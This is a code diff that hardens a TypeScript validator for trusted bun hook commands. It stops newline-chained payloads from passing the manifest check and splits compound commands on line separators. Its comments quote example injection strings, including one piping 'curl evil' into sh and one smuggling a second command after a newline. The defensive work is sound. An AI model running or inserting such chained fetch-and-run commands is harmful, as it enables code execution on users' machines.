@@ -82,13 +82,15 @@ export async function loadSrcIntegrity(claudeDir?: string): Promise<SrcIntegrity
 // `bun "$HOME/.claude/src/<dir>/<name>.ts"` — accept quoted and unquoted
 // `$HOME` and `${HOME}` forms. Allow an optional trailing arg list (some
 // hooks invoke a script with positional args, e.g. `swarm-log.ts start`),
-// but ONLY simple word-like tokens: shell metacharacters (`;`, `|`, `&`,
-// `$(`, backticks, redirects) are rejected so a payload concatenated onto a
-// trusted command (`bun .../x.ts ; curl evil | sh`) can never ride the
-// shipped-pattern match. Capture group 1 is the path relative to
-// ~/.claude/src — the install-manifest key.
+// but ONLY simple word-like tokens separated by spaces/tabs: shell
+// metacharacters (`;`, `|`, `&`, `$(`, backticks, redirects) are rejected,
+// and so are newlines — `\s` would treat `\n` as an arg separator while the
+// shell treats it as a command separator, letting a payload on the next line
+// (`bun .../x.ts\n/path/to/evilbin`) ride the shipped-pattern match.
+// Capture group 1 is the path relative to ~/.claude/src — the
+// install-manifest key.
 const TRUSTED_BUN_CC =
-  /^bun\s+"?\$\{?HOME\}?\/\.claude\/src\/((?:scripts|hooks|lib)\/[a-zA-Z0-9_-]+\.ts)"?(?:\s+[A-Za-z0-9_.:=/-]+)*\s*$/;
+  /^bun[ \t]+"?\$\{?HOME\}?\/\.claude\/src\/((?:scripts|hooks|lib)\/[a-zA-Z0-9_-]+\.ts)"?(?:[ \t]+[A-Za-z0-9_.:=/-]+)*[ \t]*$/;
 
 /** Classify a single shipped-pattern command against the install manifest. */
 function classifyShippedPath(
@@ -129,7 +131,10 @@ function classifyCompound(
   cmd: string,
   integrity: SrcIntegrity | null | undefined,
 ): { severity: HookSeverity; reasons: string[] } | null {
-  const parts = cmd.split(/\s*(?:;|&&|\|\|)\s*/).filter((p) => p.length > 0);
+  // Newlines (and the U+2028/U+2029 line separators) are command separators
+  // too — split on them like `;`/`&&` so a newline-chained pair still gets
+  // per-part manifest verification.
+  const parts = cmd.split(/\s*(?:;|&&|\|\||\r?\n|\r|\u2028|\u2029)\s*/).filter((p) => p.length > 0);
   if (parts.length < 2) return null;
   const matches = parts.map((p) => p.match(TRUSTED_BUN_CC));
   if (!matches.every((m) => m?.[1])) return null;
